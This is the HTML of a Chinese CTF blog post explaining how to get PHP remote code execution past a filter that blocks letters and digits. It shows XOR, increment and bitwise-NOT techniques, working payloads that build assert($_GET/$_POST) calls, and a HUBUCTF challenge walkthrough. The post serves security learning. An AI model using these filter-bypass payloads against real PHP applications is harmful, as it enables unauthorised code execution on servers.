@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>无数字和字母RCE | C0rnfl0w3r's Blog</title><meta name="author" content="C0rnfl0w3r"><meta name="copyright" content="C0rnfl0w3r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="无数字和字母RCE[TOC] 最原始的情况 12345678&lt;?phphighlight_file(__FILE__);$code &#x3D; $_GET[&#x27;code&#x27;];if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;    die(&quot;hacker!&quot;);&#125;@eval($code);?&amp;g">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无数字和字母RCE">
+<meta property="og:url" content="http://c0rnfl0w3r.github.io/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/index.html">
+<meta property="og:site_name" content="C0rnfl0w3r&#39;s Blog">
+<meta property="og:description" content="无数字和字母RCE[TOC] 最原始的情况 12345678&lt;?phphighlight_file(__FILE__);$code &#x3D; $_GET[&#x27;code&#x27;];if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;    die(&quot;hacker!&quot;);&#125;@eval($code);?&amp;g">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://c0rnfl0w3r.github.io/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png">
+<meta property="article:published_time" content="2024-02-05T04:23:53.000Z">
+<meta property="article:modified_time" content="2024-02-05T05:23:55.055Z">
+<meta property="article:author" content="C0rnfl0w3r">
+<meta property="article:tag" content="web笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://c0rnfl0w3r.github.io/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png"><link rel="shortcut icon" href="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png"><link rel="canonical" href="http://c0rnfl0w3r.github.io/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '无数字和字母RCE',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-02-05 13:23:55'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/%E8%83%8C%E6%99%AF.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="C0rnfl0w3r's Blog"><span class="site-name">C0rnfl0w3r's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于作者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无数字和字母RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-05T04:23:53.000Z" title="发表于 2024-02-05 12:23:53">2024-02-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-05T05:23:55.055Z" title="更新于 2024-02-05 13:23:55">2024-02-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E7%AC%94%E8%AE%B0/">web笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="无数字和字母RCE"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="无数字和字母RCE"><a href="#无数字和字母RCE" class="headerlink" title="无数字和字母RCE"></a>无数字和字母RCE</h1><p>[TOC]</p>
+<p>最原始的情况</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或"></a>1.异或</h3><p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;A&quot;</span>^<span class="string">&quot;?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后输出  ~</p>
+<p>计算过程：首先将<code>A</code>和<code>?</code>分别转换为对应的ASCII码，A变为65，?变为63，然后将其转换为对应的二进制数，A变为<code>1000001</code>，1变为<code>111111</code>，接下来就进行运算，异或的运算规则是相同为0，不同为1</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span>:      <span class="number">1000001</span></span><br><span class="line">?:      <span class="number">0111111</span>(少一位，前面补<span class="number">0</span>即可) </span><br><span class="line">结果：   <span class="number">1111110</span></span><br></pre></td></tr></table></figure>
+
+<p>异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如<code>(&#39;AB&#39;)^(&#39;11&#39;)</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;AB&quot;</span>^<span class="string">&quot;11&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后输出 ps</p>
+<hr>
+<h3 id="2-自增"><a href="#2-自增" class="headerlink" title="2.自增"></a>2.自增</h3><p>在php中，在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。并且字符变量只能递增不能递减，并且只支持字母数字的ASCII的自增，对其他字符自增无效。简单来说，就是我们可以通过自增来获取我们想要的字母。即<code>‘a++&#39;--&gt;&#39;b</code>‘;<code>&#39;b&#39;++--&gt;&#39;c&#39;</code>;<code>&#39;A&#39;++--&gt;&#39;B&#39;</code></p>
+<p>而php还有一个特性，字符串和数组拼接会返回Array。这样我们就获取到了字母。&#x3D;&#x3D;限制了字母和数字，但是我们可以传入空格&#x3D;&#x3D;</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3.png" alt="屏幕截图 2024-02-04 191838"></p>
+<p>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4.png" alt="image-20240204192356382"></p>
+<p>得到字母后就可以开始构造，例如<code>system(ls)</code>这样的命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>_=[].<span class="string">&#x27;&#x27;</span>;<span class="symbol">$</span>_=<span class="symbol">$</span>_[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>__=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>___=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_=<span class="symbol">$</span>___.<span class="symbol">$</span>__.<span class="symbol">$</span>_;<span class="symbol">$</span>_=<span class="string">&#x27;_&#x27;</span>.<span class="symbol">$</span>_;<span class="symbol">$</span><span class="symbol">$</span>_[_](<span class="symbol">$</span><span class="symbol">$</span>_[__]);</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;依情况看是否进行url编码&#x3D;&#x3D;</p>
+<p>最后用GET方式对变量<code>_</code>和<code>__</code>传参就行</p>
+<hr>
+<h3 id="3-取反"><a href="#3-取反" class="headerlink" title="3.取反"></a>3.取反</h3><p>取反其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。</p>
+<p>php中取反符号为<code>~</code>，当使用按位取反操作符 ‘~’ 时，它会翻转一个整数的所有位，举例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">10</span>; <span class="comment">// 二进制表示为 0000 1010</span></span><br><span class="line"><span class="variable">$y</span> = ~<span class="variable">$x</span>; <span class="comment">// 按位取反后为 1111 0101</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出结果为 -11</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后输出结果为-11，详细取反运算见文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">PHP ~(按位取反)位运算符</a></p>
+<p>一个简单的php取反脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data1</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;assert&#x27;</span>));<span class="comment">//通过两次取反运算得到assert</span></span><br><span class="line"><span class="variable">$data2</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;_POST&#x27;</span>));<span class="comment">//通过两次取反运算得到_POST</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>故构造payload：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);    //这里利用取反符号把它取回来，<span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);      //<span class="variable">$__</span>=_POST</span><br><span class="line"><span class="variable">$___</span>=$<span class="variable">$__</span>;                   //<span class="variable">$___</span>=<span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);                 //assert(<span class="variable">$_POST</span>[<span class="number">_</span>]);</span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);<span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>再进行POST传参，传入自己想执行的命令</p>
+<hr>
+<h3 id="更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell"><a href="#更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell" class="headerlink" title="更多自增知识点和赛题见文章从CTFShow[RCE挑战]中学习无字母数字构造webshell"></a>更多自增知识点和赛题见文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11929?time__1311=mqmx0DBG0QExlxx2DU27HYG=G8iF=x&alichlgref=https://www.google.com/#toc-14">从CTFShow[RCE挑战]中学习无字母数字构造webshell</a></h3><hr>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>一道简单的例题：</p>
+<p><strong>[HUBUCTF 2022 新生赛]HowToGetShell</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.png" alt="image-20240204190451810"></p>
+<p>过滤了字母，因为php5中的assert函数会将括号里面的字符串当作php代码来执行。因此我们可以构造出<code>assert($_GET[6])</code>，因为很多都是不可见的字符，所以说就先url编码了一下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ;s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">G:<span class="string">&#x27;%3C&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;E:<span class="string">&#x27;%3E&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>;</span><br><span class="line"><span class="regexp">//</span>拼接起来</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40%7B%7B%7B%7E%7C&#x27;</span>^<span class="string">&#x27;%21%08%08%1E%0C%08&#x27;</span>);  <span class="regexp">//</span> <span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$_1</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%3C%3E%0B&#x27;</span>^<span class="string">&#x27;%7B%7B%5F&#x27;</span>);<span class="regexp">//</span><span class="variable">$_1</span>=_GET</span><br><span class="line"><span class="variable">$_2</span>=$<span class="variable">$_1</span>; <span class="comment">#$_2=$_GET</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$_2</span>[<span class="number">6</span>]);  <span class="regexp">//</span>assert(<span class="variable">$_GET</span>[<span class="number">6</span>])</span><br></pre></td></tr></table></figure>
+
+<p>最后在环境变量中找到flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/2.png" alt="image-20240204190946852"></p>
+<p>最终payload：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>:?<span class="number">6</span>=phpinfo();</span><br><span class="line"><span class="attribute">POST</span>:mess=$_=(&#x27;%<span class="number">40</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>E%<span class="number">7</span>C&#x27;^&#x27;%<span class="number">21</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">1</span>E%<span class="number">0</span>C%<span class="number">08</span>&#x27;);$_1=&#x27;_&#x27;.(&#x27;%<span class="number">3</span>C%<span class="number">3</span>E%<span class="number">0</span>B&#x27;^&#x27;%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">5</span>F&#x27;);$_2=$$_1;$_($_2[<span class="number">6</span>]);</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://C0rnfl0w3r.github.io">C0rnfl0w3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c0rnfl0w3r.github.io/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/">http://c0rnfl0w3r.github.io/2024/02/05/无数字和字母RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://C0rnfl0w3r.github.io" target="_blank">C0rnfl0w3r's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E7%AC%94%E8%AE%B0/">web笔记</a></div><div class="post_share"><div class="social-share" data-image="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/01/31/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="第一篇博客"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第一篇博客</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E7%BD%91%E7%AB%99%E5%9B%BE%E6%A0%87.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0rnfl0w3r</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div 